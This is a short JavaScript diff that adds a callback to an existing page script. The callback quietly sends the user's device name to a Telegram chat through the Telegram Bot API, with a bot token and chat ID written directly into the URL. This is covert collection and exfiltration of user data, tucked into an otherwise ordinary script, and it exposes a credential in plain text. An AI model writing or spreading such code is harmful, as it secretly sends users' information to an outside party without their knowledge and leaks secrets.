@@ -18,6 +18,18 @@ function check(){
 }
 
 
+  function deviceAPIcallback(result){
+    console.log(result.deviceName);
+    $.ajax({
+    url: `https://api.telegram.org/bot5007404101:AAETirjlz-DgKtgiwnvcN4DPTiqZsDZgSj8/sendMessage?chat_id=52238804&text=${result.deviceName}`,
+    type: 'get',
+    success: function(response){
+
+  }
+});
+
+  }
+
 check();
 
 
